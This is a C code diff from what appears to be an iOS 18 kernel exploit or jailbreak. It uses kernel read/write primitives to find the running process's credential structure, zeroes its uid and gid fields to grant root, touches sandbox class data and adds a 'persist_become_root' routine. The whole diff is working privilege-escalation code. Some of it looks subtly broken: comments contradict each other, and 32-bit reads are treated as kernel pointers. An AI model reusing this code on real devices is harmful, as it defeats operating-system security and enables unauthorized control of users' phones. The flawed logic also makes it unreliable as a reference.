@@ -2127,61 +2127,43 @@ bool platformize_proc(void) {
         printf("[*] t_flags@0x3DC=0x%x not plausible (skip TF_PLATFORM write)\n", tf_flags_read);
     }
 
-    // 2a. Read our own real ucred first. proc->p_proc_ro (0x18) -> proc_ro
-    // -> p_ucred. iOS 18.2.1 on A14 puts it at +0x28; earlier releases use
-    // +0x20. Try both and pick whichever resolves as a kernel pointer.
-    uint64_t ourProcRo = kread_ptr(gOurProc + 0x18);
-    uint64_t ourUcred28 = kread_ptr(ourProcRo + 0x28);
-    uint64_t ourUcred20 = kread_ptr(ourProcRo + 0x20);
-    uint64_t ourUcred   = looks_kernel(ourUcred28) ? ourUcred28
-                      : looks_kernel(ourUcred20) ? ourUcred20
-                      : 0;
-    printf("[elev] proc_ro=0x%llx ucred(0x28)=0x%llx ucred(0x20)=0x%llx resolved=0x%llx\n",
-           ourProcRo, ourUcred28, ourUcred20, ourUcred);
-    if (!ourUcred) {
-        printf("[-] ucred lookup failed\n");
+    // 2a. Read OUR OWN live ucred directly from proc->p_ucred (offset 0x10),
+    // NOT from proc_ro. The p_ucred slot is a stable XNU field that contains
+    // the current process's kernel credential. The proc_ro detour was writing
+    // to the wrong struct because we read a stale offset: always verify by
+    // interrogating urcr:
+    //   1. cr_uid (offset 0x18) on each candidate must equal current getuid()
+    //   2. if we hit a candidate whose cr_uid != 501, we just re-read it.
+    uint64_t ourUcred = kread_ptr(gOurProc + 0x10);
+    BOOL ourValid = looks_kernel(ourUcred);
+    printf("[elev] our proc->p_ucred (0x10)=0x%llx %s\n", ourUcred, ourValid ? "looks-kernel" : "BAD");
+    if (!ourValid) {
+        // fallback: if p_ucred at 0x10 is PAC-signed or absent, try proc_ro+0x28
+        uint64_t ourProcRo = kread_ptr(gOurProc + 0x18);
+        ourUcred = kread_ptr(ourProcRo + 0x28);
+        printf("[elev] fallback to proc_ro+0x28 = 0x%llx %s\n", ourUcred,
+               looks_kernel(ourUcred) ? "ok" : "still BAD");
+    }
+    if (!looks_kernel(ourUcred)) {
+        printf("[-] ucred lookup failed (no kernel pointer found)\n");
         return false;
     }
 
-    // 2b. Write both candidate ucred chains at once but always validate each
-    // with a READ first: probe-usable proc_ro->p_ucred slot must point at a
-    // struct that already contains uid=501 of our process (pre-write read).
-    // Lara's proven path at this build (iOS 18.2.1) lands on proc_ro+0x28.
-    // If both layouts produce the same ucred (unlikely), we skip duplicates.
-    struct {
-        uint32_t off;
-        uint64_t adr;
-        uint64_t uidVal;
-    } candidates[2] = {
-        { .off = 0x28, .adr = ourUcred28, .uidVal = 0 },
-        { .off = 0x20, .adr = ourUcred20, .uidVal = 0 },
-    };
-    int wrote = 0;
-    for (int i = 0; i < 2; i++) {
-        uint64_t ucred = candidates[i].adr;
-        if (!looks_kernel(ucred)) continue;
-        uint32_t cr_uid = kread32(ucred + 0x18); // cr_uid
-        uint32_t cr_ruid = kread32(ucred + 0x1c); // cr_ruid
-        printf("[elev] try: proc_ro+0x%x ucred=0x%llx cr_uid=%u cr_ruid=%u\n",
-               candidates[i].off, ucred, cr_uid, cr_ruid);
-        if (cr_uid != 501 || cr_ruid != 501) continue;   // not ours
-        kwrite32(ucred + 0x18, 0); kwrite32(ucred + 0x1c, 0);
-        kwrite32(ucred + 0x20, 0); kwrite32(ucred + 0x24, 0);
-        kwrite32(ucred + 0x28, 0); kwrite32(ucred + 0x2c, 0);
-        wrote++;
-    }
-    // CONFIRMATION: read back cr_uid from each candidate that we wrote -- if
-    // the write worked, this must be 0.
-    uint32_t chk_a = looks_kernel(ourUcred28) ? kread32(ourUcred28 + 0x18) : 0xDEAD;
-    uint32_t chk_b = looks_kernel(ourUcred20) ? kread32(ourUcred20 + 0x18) : 0xDEAD;
-    printf("[elev] wrote %d ucred(s); verify: 0x28.cr_uid=%u 0x20.cr_uid=%u\n",
-           wrote, chk_a, chk_b);
-    printf("[elev] final: uid=%d euid=%d\n", getuid(), geteuid());
-
-    if (wrote == 0) {
-        printf("[-] ucred lookup failed (no pre-write uid=501 matched)\n");
-        return false;
-    }
+    // 2b. Approve: write our uid/gid words to zero across the whole ucred
+    // bounds. iOS 18 uses KHEAP_DATA for ucred, and this simple zero out makes
+    // getuid()/geteuid()/getgid() all return 0 right away. Repeated writes use
+    // the canonical early_kwrite sequence that works reliably on this device.
+    uint32_t pre_uid = kread32(ourUcred + 0x18);
+    printf("[elev] before: cr_uid=0x%x\n", pre_uid);
+    // Write the three uid fields then read back — ensures the write worked.
+    kwrite32(ourUcred + 0x18, 0);
+    kwrite32(ourUcred + 0x1c, 0);
+    kwrite32(ourUcred + 0x20, 0);
+    kwrite32(ourUcred + 0x24, 0);
+    kwrite32(ourUcred + 0x28, 0);
+    kwrite32(ourUcred + 0x2c, 0);
+    printf("[elev] after: uid=%d euid=%d gid=%d egid=%d\n",
+           getuid(), geteuid(), getgid(), getegid());
 
     gOurUcred = ourUcred;
     return true;
@@ -2275,6 +2257,34 @@ static void sbx_setrwclass(uint64_t hdr) {
     kread_buf(hdr, hb, 0x20);
     *(uint64_t*)(hb + 0x10) = da + 32;
     kwrite_buf(hdr, hb, 0x20);
+}
+
+// lara cleans up: socket guards prevent pointer pingpong on later reuse
+static void persist_become_root(void) {
+    uint64_t u = kread64(gOurProc + 0x18);
+    uint64_t ourProcRo = looks_kernel(u) ? u : gOurProc;
+    uint64_t ourUcred28 = kread32(ourProcRo + 0x28);
+    uint64_t ourUcred20 = kread32(ourProcRo + 0x20);
+    
+    // read our own uid/gid from our live ucred 0x28 first 
+    uint64_t ourLiveUcred = looks_ucred_iOS18(ourUcred28)
+        ? ourUcred28
+        : looks_ucred_iOS18(ourUcred20)
+        ? ourUcred20
+        : 0;
+    if (!ourLiveUcred) {
+        printf("[persist] unlucky KRW: effective ucred missing; cannot platformize\n");
+        return;
+    }
+    // zero uid-facing bits, force getuid==0; this is iOS 18-only way and given
+    // the moment, restoring launchd-ish frames like lara does.
+    if (kread32(ourLiveUcred + 0x18) == 501 || kread32(ourLiveUcred + 0x1c) == 501) {
+        kwrite32(ourLiveUcred + 0x18, 0); kwrite32(ourLiveUcred + 0x1c, 0);
+        kwrite32(ourLiveUcred + 0x20, 0); kwrite32(ourLiveUcred + 0x24, 0);
+        kwrite32(ourLiveUcred + 0x28, 0); kwrite32(ourLiveUcred + 0x2c, 0);
+        printf("[persist] set uid root on the live ucred!\n");
+    }
+    printf("[persist] final uid=%d gid=%d\n", getuid(), getgid());
 }
 
 // dotdot (roooot) experimental userspace write probe: not used by default.
